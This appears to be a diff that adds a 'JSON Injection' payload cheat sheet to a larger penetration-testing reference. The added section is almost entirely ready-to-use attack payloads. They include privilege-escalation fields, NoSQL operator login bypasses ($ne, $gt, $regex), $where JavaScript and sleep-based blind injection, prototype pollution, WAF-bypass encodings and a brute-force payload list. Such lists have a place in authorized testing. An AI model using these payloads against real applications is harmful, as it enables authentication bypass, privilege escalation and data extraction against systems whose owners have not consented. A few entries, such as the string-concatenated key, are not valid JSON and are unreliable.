@@ -4443,3 +4443,126 @@ Content-Type: application/json
 
 {"two_factor_enabled": false}
 ```
+
+# JSON Injection
+
+Simple Injection : {"user":"admin"} → Modifies request parameter  
+Boolean Injection : {"isAdmin":true} → Privilege escalation  
+Numeric Override : {"access":999} → High privilege access
+
+# 🔹 JSON Structure Injection
+
+Field Override : {"role":"user","role":"admin"} → Last value wins  
+Nested Injection : {"user":{"role":"admin"}} → Hidden field injection  
+Array Injection : {"role":["user","admin"]} → Multi-value confusion
+
+# 🔹 Authentication Bypass
+
+Login Bypass : {"username":"admin","password":{"$ne":null}} → NoSQL bypass  
+Always True : {"password":{"$gt":""}} → Matches any value  
+Regex Bypass : {"username":{"$regex":".*"}} → Matches all users
+
+# 🔹 NoSQL Injection Payloads
+
+Not Equal : {"user":{"$ne":null}} → Matches any non-null  
+Greater Than : {"id":{"$gt":1}} → Expands results  
+Exists Check : {"admin":{"$exists":true}} → Detect fields  
+Regex Match : {"user":{"$regex":"admin"}} → Partial match
+
+# 🔹 Logic Manipulation
+
+Boolean Flip : {"isAdmin":false,"isAdmin":true} → Override logic  
+Status Change : {"status":"completed"} → Business logic abuse  
+Permission Injection : {"permissions":"all"} → Full access
+
+# 🔹 Data Extraction
+
+Wildcard Query : {"user":{"$regex":".*"}} → Dump data  
+Field Enumeration : {"password":{"$exists":true}} → Reveal structure  
+Conditional Extract : {"user":{"$gt":""}} → Broad results
+
+# 🔹 Blind JSON Injection
+
+Boolean True : {"user":{"$ne":"invalid"}} → Success condition  
+Boolean False : {"user":{"$eq":"invalid"}} → Compare response  
+Time Delay (MongoDB) : {"$where":"sleep(5000)"} → Delay detection
+
+# 🔹 Advanced Injection
+
+JavaScript Injection : {"$where":"this.user=='admin'"} → Execute condition  
+Function Injection : {"$where":"return true"} → Force match  
+Object Injection : {"data":{"role":"admin","access":999}}
+
+# 🔹 Prototype Pollution (JSON)
+
+Proto Injection : {"__proto__":{"admin":true}} → Modify object prototype  
+Constructor Injection : {"constructor":{"prototype":{"admin":true}}}  
+Merge Attack : {"payload":{"__proto__":{"isAdmin":true}}}
+
+# 🔹 JSON Padding / Wrapping
+
+Wrapped Payload : {"data":{"user":{"role":"admin"}}} → Bypass validation  
+Deep Nesting : {"a":{"b":{"c":{"role":"admin"}}}}  
+Mixed Structure : {"meta":{"permissions":"admin"}}
+
+# 🔹 WAF Bypass (JSON Injection)
+
+## 🧩 Encoding Tricks
+
+URL Encoding : %7B%22role%22%3A%22admin%22%7D → Encoded JSON  
+Double Encoding : %257B%2522role%2522%253A%2522admin%2522%257D  
+Unicode Encoding : {"r\u006fle":"admin"}
+
+## 🧩 Case Variation
+
+Mixed Case : {"RoLe":"AdMiN"} → Bypass strict filters  
+Uppercase Keys : {"ROLE":"ADMIN"}
+
+## 🧩 Structure Obfuscation
+
+Whitespace Tricks :  { "role" : "admin" }
+Nested Wrapper :  {"data":{"role":"admin"}}
+Split Keys :  {"ro"+"le":"admin"}
+
+## 🧩 Duplicate Key Override
+
+Multi-key Injection :    {"role":"user","role":"admin"}
+Layer Override : {"role":"user","data":{"role":"admin"}}
+
+## 🧩 Content-Type Bypass
+
+Send as Text : Content-Type: text/plain → Still parsed as JSON  
+Form Conversion : role=admin&isAdmin=true  
+Multipart : multipart/form-data
+
+# 🔹 Brute Force JSON Payload List
+## ✅ Basic Injection
+
+{"role":"admin"}
+{"isAdmin":true}
+{"access":999}
+{"admin":1}
+
+## ✅ NoSQL Injection
+
+{"user":{"$ne":null}}
+{"user":{"$gt":""}}
+{"user":{"$regex":".*"}}
+{"password":{"$exists":true}}
+
+
+## ✅ Authentication Bypass
+
+{"username":"admin","password":{"$ne":null}}
+{"username":{"$regex":".*"},"password":{"$ne":null}}
+
+
+## ✅ Prototype Pollution
+
+{"__proto__":{"admin":true}}
+{"constructor":{"prototype":{"admin":true}}}
+
+## ✅ Encoded Variants
+
+%7B%22role%22%3A%22admin%22%7D
+\u007b\u0022role\u0022:\u0022admin\u0022\u007d
